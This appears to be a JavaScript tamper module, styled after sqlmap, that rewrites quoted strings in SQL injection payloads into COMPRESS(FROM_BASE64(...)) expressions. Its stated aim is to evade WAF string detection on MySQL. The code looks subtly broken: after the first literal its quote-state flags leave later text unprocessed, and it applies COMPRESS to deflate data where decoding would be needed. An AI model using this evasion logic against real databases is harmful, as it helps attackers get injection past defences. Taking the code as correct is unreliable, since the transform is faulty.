// 压缩编码：将字符串字面量用 COMPRESS() 编码（对标 sqlmap compression.py）
// 适用于支持 COMPRESS/UNCOMPRESS 函数的 MySQL/MariaDB
import { deflateSync } from 'node:zlib';

export const compression = {
  name: 'compression',
  description: '将字符串字面量用 COMPRESS() 编码，绕过 WAF 字符串检测（MySQL 专用）',
  transform(payload, ctx) {
    const src = String(payload ?? '');
    let out = '';
    let inSingle = false, inDouble = false;
    for (let i = 0; i < src.length; i++) {
      const ch = src[i], prev = src[i - 1];
      if (inSingle) {
        if (ch === "'" && prev !== '\\') { inSingle = false; out += ch; }
        else out += ch;
        continue;
      }
      if (inDouble) {
        if (ch === '"' && prev !== '\\') { inDouble = false; out += ch; }
        else out += ch;
        continue;
      }
      if (ch === "'") {
        inSingle = true;
        let str = '';
        for (let j = i + 1; j < src.length; j++) {
          const c = src[j];
          if (c === "'" && src[j - 1] !== '\\') { i = j; break; }
          str += c;
        }
        const compressed = deflateSync(Buffer.from(str)).toString('base64');
        out += `COMPRESS(FROM_BASE64('${compressed}'))`;
      } else if (ch === '"') {
        inDouble = true;
        let str = '';
        for (let j = i + 1; j < src.length; j++) {
          const c = src[j];
          if (c === '"' && src[j - 1] !== '\\') { i = j; break; }
          str += c;
        }
        const compressed = deflateSync(Buffer.from(str)).toString('base64');
        out += `COMPRESS(FROM_BASE64('${compressed}'))`;
      } else {
        out += ch;
      }
    }
    return out;
  },
};
export default compression;